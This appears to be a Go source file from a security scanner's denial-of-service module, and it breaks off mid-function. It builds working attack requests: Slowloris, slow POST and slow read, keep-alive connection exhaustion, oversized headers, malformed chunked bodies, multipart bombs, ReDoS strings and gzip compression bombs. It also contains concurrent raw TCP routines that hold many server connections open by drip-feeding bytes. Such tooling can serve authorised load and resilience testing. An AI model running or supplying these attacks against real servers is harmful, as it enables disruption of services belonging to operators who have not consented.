package attacks

import (
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/cornerglitch/internal/scanner"
)

// SlowHTTPModule generates attack requests designed to exhaust server
// resources through slow HTTP techniques: partial headers, slow POST bodies,
// slow reads, connection exhaustion, large headers, chunked abuse,
// multipart bombs, ReDoS payloads, and compression bombs.
type SlowHTTPModule struct{}

func (m *SlowHTTPModule) Name() string     { return "slowhttp" }
func (m *SlowHTTPModule) Category() string { return "denial-of-service" }

func (m *SlowHTTPModule) GenerateRequests(target string) []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	reqs = append(reqs, m.slowloris()...)
	reqs = append(reqs, m.slowPost()...)
	reqs = append(reqs, m.slowRead()...)
	reqs = append(reqs, m.connectionExhaustion()...)
	reqs = append(reqs, m.largeHeaders()...)
	reqs = append(reqs, m.chunkedAbuse()...)
	reqs = append(reqs, m.multipartBomb()...)
	reqs = append(reqs, m.redosPayloads()...)
	reqs = append(reqs, m.compressionBomb()...)

	return reqs
}

// ---------------------------------------------------------------------------
// Slowloris — partial HTTP headers sent slowly
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) slowloris() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/", "/login", "/api/v1/users", "/admin"}

	for _, path := range paths {
		// Build incrementing X-Slowloris headers to keep the connection open
		// while the server waits for the final \r\n\r\n.
		headers := make(map[string]string)
		for i := 0; i < 20; i++ {
			headers[fmt.Sprintf("X-Slowloris-%d", i)] = fmt.Sprintf("keep-alive-%d", i)
		}
		headers["X-Glitch-Slow"] = "true"
		headers["Connection"] = "keep-alive"

		reqs = append(reqs, scanner.AttackRequest{
			Method:      "GET",
			Path:        path,
			Headers:     headers,
			Category:    "Slow-HTTP",
			SubCategory: "slowloris",
			Description: fmt.Sprintf("Slowloris: partial headers with 20 X-Slowloris-N headers on %s", path),
		})
	}

	// Variant with very long header values to delay parsing
	longHeaders := make(map[string]string)
	for i := 0; i < 10; i++ {
		longHeaders[fmt.Sprintf("X-Slowloris-%d", i)] = strings.Repeat("slow", 250)
	}
	longHeaders["X-Glitch-Slow"] = "true"
	longHeaders["Connection"] = "keep-alive"

	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/",
		Headers:     longHeaders,
		Category:    "Slow-HTTP",
		SubCategory: "slowloris",
		Description: "Slowloris: 10 headers with 1KB values each",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Slow POST (R-U-Dead-Yet) — large Content-Length, tiny actual body
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) slowPost() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/", "/login", "/api/v1/users", "/upload", "/search"}
	contentTypes := []struct {
		ct   string
		body string
		desc string
	}{
		{"application/x-www-form-urlencoded", "username=slow", "form data"},
		{"application/json", `{"slow":true}`, "JSON body"},
		{"text/plain", "drip", "plain text"},
		{"application/xml", "<slow>true</slow>", "XML body"},
	}

	for _, path := range paths {
		for _, ct := range contentTypes {
			reqs = append(reqs, scanner.AttackRequest{
				Method:   "POST",
				Path:     path,
				Body:     ct.body,
				BodyType: ct.ct,
				Headers: map[string]string{
					"Content-Length": "1048576", // 1MB declared
					"X-Glitch-Slow": "true",
					"Connection":    "keep-alive",
				},
				Category:    "Slow-HTTP",
				SubCategory: "slow-post",
				Description: fmt.Sprintf("Slow POST (RUDY): 1MB Content-Length, tiny %s body on %s", ct.desc, path),
			})
		}
	}

	// Extreme variant: 10MB declared Content-Length
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "x",
		BodyType: "application/octet-stream",
		Headers: map[string]string{
			"Content-Length": "10485760", // 10MB declared
			"X-Glitch-Slow": "true",
			"Connection":    "keep-alive",
		},
		Category:    "Slow-HTTP",
		SubCategory: "slow-post",
		Description: "Slow POST (RUDY): 10MB Content-Length, 1-byte body",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Slow READ — normal request, slow response consumption
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) slowRead() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/", "/api/v1/users", "/search?q=test", "/vuln/a03/search?q=data"}

	for _, path := range paths {
		reqs = append(reqs, scanner.AttackRequest{
			Method: "GET",
			Path:   path,
			Headers: map[string]string{
				"X-Glitch-Slow":   "true",
				"Connection":      "keep-alive",
				"Accept-Encoding": "identity", // no compression so response is large
			},
			Category:    "Slow-HTTP",
			SubCategory: "slow-read",
			Description: fmt.Sprintf("Slow READ: request with identity encoding to maximize response size on %s", path),
		})
	}

	// Request large content with small window advertisement
	reqs = append(reqs, scanner.AttackRequest{
		Method: "GET",
		Path:   "/",
		Headers: map[string]string{
			"X-Glitch-Slow":   "true",
			"Connection":      "keep-alive",
			"Accept-Encoding": "identity",
			"Range":           "bytes=0-",
		},
		Category:    "Slow-HTTP",
		SubCategory: "slow-read",
		Description: "Slow READ: Range request for full content with slow consumption",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Connection Exhaustion — many keep-alive connections
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) connectionExhaustion() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	paths := []string{"/", "/login", "/api/v1/users", "/search", "/admin"}

	for _, path := range paths {
		// Standard keep-alive exhaustion
		reqs = append(reqs, scanner.AttackRequest{
			Method: "GET",
			Path:   path,
			Headers: map[string]string{
				"Connection": "keep-alive",
				"Keep-Alive": "timeout=300, max=1000",
			},
			Category:    "Slow-HTTP",
			SubCategory: "connection-exhaustion",
			Description: fmt.Sprintf("Connection exhaustion: keep-alive timeout=300 max=1000 on %s", path),
		})

		// Pipelining-style: multiple requests implied
		reqs = append(reqs, scanner.AttackRequest{
			Method: "GET",
			Path:   path,
			Headers: map[string]string{
				"Connection": "keep-alive",
				"Keep-Alive": "timeout=600, max=10000",
				"X-Pipeline":  "true",
			},
			Category:    "Slow-HTTP",
			SubCategory: "connection-exhaustion",
			Description: fmt.Sprintf("Connection exhaustion: aggressive keep-alive timeout=600 max=10000 on %s", path),
		})
	}

	// Multiple connection-holding variants
	for i := 0; i < 10; i++ {
		reqs = append(reqs, scanner.AttackRequest{
			Method: "GET",
			Path:   fmt.Sprintf("/?conn_exhaust=%d", i),
			Headers: map[string]string{
				"Connection": "keep-alive",
				"Keep-Alive": "timeout=900, max=99999",
				"X-Conn-ID":  fmt.Sprintf("exhaust-%d", i),
			},
			Category:    "Slow-HTTP",
			SubCategory: "connection-exhaustion",
			Description: fmt.Sprintf("Connection exhaustion: parallel connection #%d with extreme keep-alive", i),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// Large Header Attack — 32KB-64KB of headers
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) largeHeaders() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// 32KB of headers: 32 headers * 1KB each
	headers32k := make(map[string]string)
	for i := 0; i < 32; i++ {
		headers32k[fmt.Sprintf("X-Padding-%05d", i)] = strings.Repeat("A", 1024)
	}
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/",
		Headers:     headers32k,
		Category:    "Slow-HTTP",
		SubCategory: "large-headers",
		Description: "Large header attack: 32KB total (32 headers x 1KB)",
	})

	// 48KB of headers: 48 headers * 1KB each
	headers48k := make(map[string]string)
	for i := 0; i < 48; i++ {
		headers48k[fmt.Sprintf("X-Padding-%05d", i)] = strings.Repeat("A", 1024)
	}
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/",
		Headers:     headers48k,
		Category:    "Slow-HTTP",
		SubCategory: "large-headers",
		Description: "Large header attack: 48KB total (48 headers x 1KB)",
	})

	// 64KB of headers: 64 headers * 1KB each
	headers64k := make(map[string]string)
	for i := 0; i < 64; i++ {
		headers64k[fmt.Sprintf("X-Padding-%05d", i)] = strings.Repeat("A", 1024)
	}
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/",
		Headers:     headers64k,
		Category:    "Slow-HTTP",
		SubCategory: "large-headers",
		Description: "Large header attack: 64KB total (64 headers x 1KB)",
	})

	// Single massive header
	reqs = append(reqs, scanner.AttackRequest{
		Method: "GET",
		Path:   "/",
		Headers: map[string]string{
			"X-Mega-Header": strings.Repeat("B", 65536),
		},
		Category:    "Slow-HTTP",
		SubCategory: "large-headers",
		Description: "Large header attack: single 64KB header value",
	})

	// Many small headers adding up to 32KB+
	manyHeaders := make(map[string]string)
	for i := 0; i < 500; i++ {
		manyHeaders[fmt.Sprintf("X-H-%05d", i)] = strings.Repeat("V", 64)
	}
	reqs = append(reqs, scanner.AttackRequest{
		Method:      "GET",
		Path:        "/",
		Headers:     manyHeaders,
		Category:    "Slow-HTTP",
		SubCategory: "large-headers",
		Description: "Large header attack: 500 headers x 64 bytes (~32KB)",
	})

	// Cookie header with massive value
	reqs = append(reqs, scanner.AttackRequest{
		Method: "GET",
		Path:   "/",
		Headers: map[string]string{
			"Cookie": strings.Repeat("session="+strings.Repeat("X", 500)+"; ", 64),
		},
		Category:    "Slow-HTTP",
		SubCategory: "large-headers",
		Description: "Large header attack: massive Cookie header (~32KB)",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Chunked Request Abuse — invalid sizes, infinite chunks, slow delivery
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) chunkedAbuse() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// Invalid chunk size (negative)
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "-1\r\ndata\r\n0\r\n\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: negative chunk size",
	})

	// Invalid chunk size (hex overflow)
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "FFFFFFFFFFFFFFFF\r\ndata\r\n0\r\n\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: chunk size overflow (16 F's)",
	})

	// Mismatched chunk size (says 1000 but sends 4 bytes)
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "3e8\r\ndata\r\n0\r\n\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: chunk size 1000 but only 4 bytes sent",
	})

	// Many tiny chunks (simulate slow delivery)
	var tinyChunks strings.Builder
	for i := 0; i < 100; i++ {
		tinyChunks.WriteString("1\r\nX\r\n")
	}
	tinyChunks.WriteString("0\r\n\r\n")
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     tinyChunks.String(),
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
			"X-Glitch-Slow":    "true",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: 100 single-byte chunks (slow delivery)",
	})

	// No terminal chunk
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "4\r\ndata\r\n4\r\nmore\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: missing terminal 0-length chunk",
	})

	// Chunk extensions abuse
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "4;" + strings.Repeat("ext=val;", 100) + "\r\ndata\r\n0\r\n\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: excessive chunk extensions",
	})

	// Invalid chunk encoding (non-hex characters in size)
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "ZZZZ\r\ndata\r\n0\r\n\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: non-hex chunk size",
	})

	// Chunk with trailing headers (trailers)
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     "4\r\ndata\r\n0\r\nX-Trailer: evil\r\nX-Trailer-2: " + strings.Repeat("A", 4096) + "\r\n\r\n",
		BodyType: "text/plain",
		Headers: map[string]string{
			"Transfer-Encoding": "chunked",
			"Trailer":           "X-Trailer, X-Trailer-2",
		},
		Category:    "Slow-HTTP",
		SubCategory: "chunked-abuse",
		Description: "Chunked abuse: oversized trailing headers (4KB trailer)",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Multipart Form Bomb — thousands of parts, huge boundaries
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) multipartBomb() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// Boundary with maximum length
	longBoundary := strings.Repeat("X", 70) // RFC 2046 max boundary is 70 chars

	// Multipart with 1000 empty parts
	var manyParts strings.Builder
	for i := 0; i < 1000; i++ {
		manyParts.WriteString(fmt.Sprintf("--%s\r\n", longBoundary))
		manyParts.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"field%d\"\r\n\r\n", i))
		manyParts.WriteString("x\r\n")
	}
	manyParts.WriteString(fmt.Sprintf("--%s--\r\n", longBoundary))

	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/upload",
		Body:     manyParts.String(),
		BodyType: fmt.Sprintf("multipart/form-data; boundary=%s", longBoundary),
		Category:    "Slow-HTTP",
		SubCategory: "multipart-bomb",
		Description: "Multipart bomb: 1000 parts with 70-char boundary",
	})

	// Multipart with deeply nested boundaries
	innerBoundary := strings.Repeat("Y", 70)
	var nestedBody strings.Builder
	nestedBody.WriteString(fmt.Sprintf("--%s\r\n", longBoundary))
	nestedBody.WriteString(fmt.Sprintf("Content-Type: multipart/mixed; boundary=%s\r\n\r\n", innerBoundary))
	for i := 0; i < 100; i++ {
		nestedBody.WriteString(fmt.Sprintf("--%s\r\n", innerBoundary))
		nestedBody.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"nested%d\"\r\n\r\n", i))
		nestedBody.WriteString(strings.Repeat("Z", 100))
		nestedBody.WriteString("\r\n")
	}
	nestedBody.WriteString(fmt.Sprintf("--%s--\r\n", innerBoundary))
	nestedBody.WriteString(fmt.Sprintf("--%s--\r\n", longBoundary))

	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/upload",
		Body:     nestedBody.String(),
		BodyType: fmt.Sprintf("multipart/form-data; boundary=%s", longBoundary),
		Category:    "Slow-HTTP",
		SubCategory: "multipart-bomb",
		Description: "Multipart bomb: nested multipart with 100 inner parts",
	})

	// Multipart with file upload fields and large filenames
	var filenameBomb strings.Builder
	for i := 0; i < 50; i++ {
		filenameBomb.WriteString(fmt.Sprintf("--%s\r\n", longBoundary))
		longFilename := strings.Repeat("A", 1024)
		filenameBomb.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"file%d\"; filename=\"%s.txt\"\r\n", i, longFilename))
		filenameBomb.WriteString("Content-Type: application/octet-stream\r\n\r\n")
		filenameBomb.WriteString("data\r\n")
	}
	filenameBomb.WriteString(fmt.Sprintf("--%s--\r\n", longBoundary))

	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/upload",
		Body:     filenameBomb.String(),
		BodyType: fmt.Sprintf("multipart/form-data; boundary=%s", longBoundary),
		Category:    "Slow-HTTP",
		SubCategory: "multipart-bomb",
		Description: "Multipart bomb: 50 file parts with 1KB filenames each",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// ReDoS Payloads — catastrophic backtracking patterns
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) redosPayloads() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// Classic ReDoS patterns: (a+)+$ with many a's then a non-matching char
	redosStrings := []struct {
		payload string
		desc    string
	}{
		{strings.Repeat("a", 30) + "!", "(a+)+$ pattern — 30 a's + non-match"},
		{strings.Repeat("a", 25) + "b", "(a+)+b$ pattern — 25 a's + wrong char"},
		{"0" + strings.Repeat("1", 30) + "!", "(0|0?1+)+ pattern — 30 1's + non-match"},
		{strings.Repeat("ab", 20) + "c", "((ab)+)+$ pattern — 20 ab's + non-match"},
		{strings.Repeat("a", 30) + "\x00", "(a+)+$ with null terminator"},
		{strings.Repeat("aaa", 15) + "X", "(a{3})+$ pattern — 45 a's + non-match"},
		{"<" + strings.Repeat(" ", 30) + "!", "HTML tag regex backtrack"},
		{strings.Repeat("a@", 15) + "!", "Email regex backtrack pattern"},
		{"http://" + strings.Repeat("a", 30) + "!", "URL regex backtrack pattern"},
		{strings.Repeat("\\", 30) + "!", "Escape sequence backtrack pattern"},
	}

	// As URL parameters
	paths := []string{"/search", "/api/v1/users", "/login"}
	for _, path := range paths {
		for _, r := range redosStrings {
			reqs = append(reqs, scanner.AttackRequest{
				Method:      "GET",
				Path:        fmt.Sprintf("%s?q=%s", path, r.payload),
				Category:    "Slow-HTTP",
				SubCategory: "redos",
				Description: fmt.Sprintf("ReDoS via URL param on %s: %s", path, r.desc),
			})
		}
	}

	// As form fields
	for _, r := range redosStrings {
		reqs = append(reqs, scanner.AttackRequest{
			Method:   "POST",
			Path:     "/search",
			Body:     fmt.Sprintf("query=%s&pattern=%s", r.payload, r.payload),
			BodyType: "application/x-www-form-urlencoded",
			Category:    "Slow-HTTP",
			SubCategory: "redos",
			Description: fmt.Sprintf("ReDoS via POST form field: %s", r.desc),
		})
	}

	// As headers
	for _, r := range redosStrings {
		reqs = append(reqs, scanner.AttackRequest{
			Method: "GET",
			Path:   "/",
			Headers: map[string]string{
				"User-Agent": r.payload,
				"Referer":    r.payload,
			},
			Category:    "Slow-HTTP",
			SubCategory: "redos",
			Description: fmt.Sprintf("ReDoS via headers (UA + Referer): %s", r.desc),
		})
	}

	return reqs
}

// ---------------------------------------------------------------------------
// Compression Bomb — gzip-encoded body of zeros
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) compressionBomb() []scanner.AttackRequest {
	var reqs []scanner.AttackRequest

	// Generate a gzip-compressed stream of 10MB of zeros.
	// This compresses down to a very small payload.
	var buf bytes.Buffer
	gw, err := gzip.NewWriterLevel(&buf, gzip.BestCompression)
	if err != nil {
		// Fallback: use default compression
		gw = gzip.NewWriter(&buf)
	}

	// Write 10MB of zeros in chunks to avoid huge memory allocation
	zeroChunk := make([]byte, 65536) // 64KB of zeros
	for i := 0; i < 160; i++ {      // 160 * 64KB = ~10MB
		gw.Write(zeroChunk)
	}
	gw.Close()

	compressedBody := buf.String()

	paths := []string{"/", "/api/v1/users", "/upload", "/search"}
	for _, path := range paths {
		reqs = append(reqs, scanner.AttackRequest{
			Method:   "POST",
			Path:     path,
			Body:     compressedBody,
			BodyType: "application/octet-stream",
			Headers: map[string]string{
				"Content-Encoding": "gzip",
			},
			Category:    "Slow-HTTP",
			SubCategory: "compression-bomb",
			Description: fmt.Sprintf("Compression bomb: 10MB of zeros gzip-compressed on %s", path),
		})
	}

	// Variant with application/json content type
	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/api/v1/users",
		Body:     compressedBody,
		BodyType: "application/json",
		Headers: map[string]string{
			"Content-Encoding": "gzip",
		},
		Category:    "Slow-HTTP",
		SubCategory: "compression-bomb",
		Description: "Compression bomb: gzip zeros claiming to be JSON",
	})

	// Double-compressed variant
	var buf2 bytes.Buffer
	gw2, _ := gzip.NewWriterLevel(&buf2, gzip.BestCompression)
	gw2.Write(buf.Bytes())
	gw2.Close()

	reqs = append(reqs, scanner.AttackRequest{
		Method:   "POST",
		Path:     "/",
		Body:     buf2.String(),
		BodyType: "application/octet-stream",
		Headers: map[string]string{
			"Content-Encoding": "gzip, gzip",
		},
		Category:    "Slow-HTTP",
		SubCategory: "compression-bomb",
		Description: "Compression bomb: double-gzipped 10MB of zeros",
	})

	return reqs
}

// ---------------------------------------------------------------------------
// Raw TCP Socket Attacks — bypass Go's net/http to send malformed data
// ---------------------------------------------------------------------------

// RawSocketConfig holds parameters for the raw TCP attack methods.
type RawSocketConfig struct {
	Concurrency int           // number of parallel connections per attack type
	Timeout     time.Duration // per-connection timeout
}

// Run executes raw TCP socket attacks against the target that bypass Go's
// net/http client. These attacks open raw TCP connections and send partial,
// malformed, or slow data to exhaust server resources. The target should
// include scheme and host (e.g. "http://localhost:8765"). Returns findings
// when degradation is detected.
func (m *SlowHTTPModule) Run(ctx context.Context, target string, cfg RawSocketConfig) []scanner.Finding {
	if cfg.Concurrency <= 0 {
		cfg.Concurrency = 10
	}
	if cfg.Timeout <= 0 {
		cfg.Timeout = 30 * time.Second
	}

	parsed, err := url.Parse(target)
	if err != nil {
		return nil
	}
	host := parsed.Host
	if !strings.Contains(host, ":") {
		if parsed.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	var (
		mu       sync.Mutex
		findings []scanner.Finding
	)
	addFinding := func(f scanner.Finding) {
		mu.Lock()
		findings = append(findings, f)
		mu.Unlock()
	}

	// Track all connections so we can close them on context cancellation.
	var (
		connMu sync.Mutex
		conns  []net.Conn
	)
	trackConn := func(c net.Conn) {
		connMu.Lock()
		conns = append(conns, c)
		connMu.Unlock()
	}

	// Run all attack types concurrently.
	var wg sync.WaitGroup

	// 1. True Slowloris — partial headers, one byte every 10s
	wg.Add(1)
	go func() {
		defer wg.Done()
		results := m.rawSlowloris(ctx, host, parsed.Host, cfg)
		for _, c := range results.conns {
			trackConn(c)
		}
		for _, f := range results.findings {
			addFinding(f)
		}
	}()

	// 2. Incomplete chunked encoding
	wg.Add(1)
	go func() {
		defer wg.Done()
		results := m.rawChunkedHold(ctx, host, parsed.Host, cfg)
		for _, c := range results.conns {
			trackConn(c)
		}
		for _, f := range results.findings {
			addFinding(f)
		}
	}()

	// 3. Keep-alive connection holding (idle connection exhaustion)
	wg.Add(1)
	go func() {
		defer wg.Done()
		results := m.rawKeepAliveHold(ctx, host, parsed.Host, cfg)
		for _, c := range results.conns {
			trackConn(c)
		}
		for _, f := range results.findings {
			addFinding(f)
		}
	}()

	// 4. Slow POST body — send one byte at a time
	wg.Add(1)
	go func() {
		defer wg.Done()
		results := m.rawSlowPostBody(ctx, host, parsed.Host, cfg)
		for _, c := range results.conns {
			trackConn(c)
		}
		for _, f := range results.findings {
			addFinding(f)
		}
	}()

	// Wait for all attacks to finish or context cancellation.
	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()
	select {
	case <-done:
	case <-ctx.Done():
	}

	// Health probe: check if the target is still responding after attacks.
	degraded, probeLatency := m.probeHealth(target, cfg.Timeout)
	if degraded {
		addFinding(scanner.Finding{
			Category:    "Slow-HTTP",
			Severity:    "high",
			URL:         target,
			Method:      "GET",
			StatusCode:  0,
			Evidence:    fmt.Sprintf("Health probe failed or slow (latency: %v) after raw socket attacks", probeLatency),
			Description: "Target appears degraded after raw TCP socket attacks — possible connection exhaustion or resource starvation",
		})
	}

	// Close all held connections.
	connMu.Lock()
	for _, c := range conns {
		c.Close()
	}
	connMu.Unlock()

	return findings
}

// rawAttackResult holds connections and findings from a raw attack.
type rawAttackResult struct {
	conns    []net.Conn
	findings []scanner.Finding
}

// ---------------------------------------------------------------------------
// rawSlowloris — true Slowloris: send partial HTTP headers, one byte at a time
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) rawSlowloris(ctx context.Context, addr, hostHeader string, cfg RawSocketConfig) rawAttackResult {
	var result rawAttackResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	for i := 0; i < cfg.Concurrency; i++ {
		wg.Add(1)
		go func(connID int) {
			defer wg.Done()

			conn, err := net.DialTimeout("tcp", addr, cfg.Timeout)
			if err != nil {
				return
			}

			mu.Lock()
			result.conns = append(result.conns, conn)
			mu.Unlock()

			// Send initial request line and Host header.
			initial := fmt.Sprintf("GET /?slowloris=%d HTTP/1.1\r\nHost: %s\r\n", connID, hostHeader)
			conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
			_, err = conn.Write([]byte(initial))
			if err != nil {
				return
			}

			// Now drip-feed one header byte every 10 seconds to keep the
			// connection open. The server is waiting for \r\n\r\n to end
			// the headers, which we never send.
			headerNum := 0
			ticker := time.NewTicker(10 * time.Second)
			defer ticker.Stop()

			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					headerLine := fmt.Sprintf("X-Slowloris-%d: keep-alive\r\n", headerNum)
					conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
					_, err := conn.Write([]byte(headerLine))
					if err != nil {
						// Server closed the connection — that's a finding
						// if it happened early (server may have a timeout).
						mu.Lock()
						result.findings = append(result.findings, scanner.Finding{
							Category:    "Slow-HTTP",
							Severity:    "info",
							URL:         fmt.Sprintf("tcp://%s/?slowloris=%d", addr, connID),
							Method:      "RAW-TCP",
							StatusCode:  0,
							Evidence:    fmt.Sprintf("Connection closed after %d slow headers: %v", headerNum, err),
							Description: fmt.Sprintf("Slowloris raw TCP: server closed connection after %d drip-fed headers (10s interval)", headerNum),
						})
						mu.Unlock()
						return
					}
					headerNum++
				}
			}
		}(i)
	}

	// Let the attack run for the timeout duration or until cancelled.
	select {
	case <-ctx.Done():
	case <-time.After(cfg.Timeout):
	}

	return result
}

// ---------------------------------------------------------------------------
// rawChunkedHold — send incomplete chunked encoding, never finish
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) rawChunkedHold(ctx context.Context, addr, hostHeader string, cfg RawSocketConfig) rawAttackResult {
	var result rawAttackResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	for i := 0; i < cfg.Concurrency; i++ {
		wg.Add(1)
		go func(connID int) {
			defer wg.Done()

			conn, err := net.DialTimeout("tcp", addr, cfg.Timeout)
			if err != nil {
				return
			}

			mu.Lock()
			result.conns = append(result.conns, conn)
			mu.Unlock()

			// Send a complete POST request with chunked encoding, but
			// never send the terminal "0\r\n\r\n" chunk.
			req := fmt.Sprintf(
				"POST /?chunked_hold=%d HTTP/1.1\r\n"+
					"Host: %s\r\n"+
					"Transfer-Encoding: chunked\r\n"+
					"Content-Type: text/plain\r\n"+
					"Connection: keep-alive\r\n"+
					"\r\n"+
					"1\r\nX\r\n",
				connID, hostHeader,
			)

			conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
			_, err = conn.Write([]byte(req))
			if err != nil {
				return
			}

			// Drip-feed tiny chunks every 15 seconds to keep connection alive,
			// but never send the zero-length terminator.
			chunkNum := 0
			ticker := time.NewTicker(15 * time.Second)
			defer ticker.Stop()

			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					chunk := "1\r\nX\r\n" // valid 1-byte chunk
					conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
					_, err := conn.Write([]byte(chunk))
					if err != nil {
						mu.Lock()
						result.findings = append(result.findings, scanner.Finding{
							Category:    "Slow-HTTP",
							Severity:    "info",
							URL:         fmt.Sprintf("tcp://%s/?chunked_hold=%d", addr, connID),
							Method:      "RAW-TCP",
							StatusCode:  0,
							Evidence:    fmt.Sprintf("Connection closed after %d incomplete chunks: %v", chunkNum, err),
							Description: fmt.Sprintf("Chunked hold raw TCP: server closed connection after %d drip-fed chunks (15s interval)", chunkNum),
						})
						mu.Unlock()
						return
					}
					chunkNum++
				}
			}
		}(i)
	}

	select {
	case <-ctx.Done():
	case <-time.After(cfg.Timeout):
	}

	return result
}

// ---------------------------------------------------------------------------
// rawKeepAliveHold — complete a request, then hold the keep-alive connection
// ---------------------------------------------------------------------------

func (m *SlowHTTPModule) rawKeepAliveHold(ctx context.Context, addr, hostHeader string, cfg RawSocketConfig) rawAttackResult {
	var result rawAttackResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	for i := 0; i < cfg.Concurrency; i++ {
		wg.Add(1)
		go func(connID int) {
			defer wg.Done()

			conn, err := net.DialTimeout("tcp", addr, cfg.Timeout)
			if err != nil {
				return
			}

			mu.Lock()
			result.conns = append(result.conns, conn)
			mu.Unlock()

			// Send a valid HTTP request with keep-alive.
			req := fmt.Sprintf(
				"GET /?keepalive_hold=%d HTTP/1.1\r\n"+
					"Host: %s\r\n"+
					"Connection: keep-alive\r\n"+
					"Keep-Alive: timeout=600, max=99999\r\n"+
					"\r\n",
				connID, hostHeader,
			)

			conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
			_, err = conn.Write([]byte(req))
			if err != nil {
				return
			}

			// Read the response (drain it) but don't send a second request.
			// The connection stays open, consuming a server slot.
			conn.SetReadDeadline(time.Now().Add(cfg.Timeout))
			buf := make([]byte, 4096)
			for {
				_, readErr := conn.Read(buf)
				if readErr != nil {
					break
				}
			}

			// Now just hold the connection open. Send a single byte every
			// 30 seconds to prevent idle timeout.
			ticker := time.NewTicker(30 * time.Second)
			defer ticker.Stop()

			holdTime := 0
			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					holdTime += 30
					// Try to send another request to reset the idle timer.
					keepReq := fmt.Sprintf(
						"GET /?keepalive_ping=%d&t=%d HTTP/1.1\r\n"+
							"Host: %s\r\n"+
							"Connection: keep-alive\r\n"+
							"\r\n",
						connID, holdTime, hostHeader,
					)
					conn.SetWriteDeadline(time.Now().Add(cfg.Timeout))
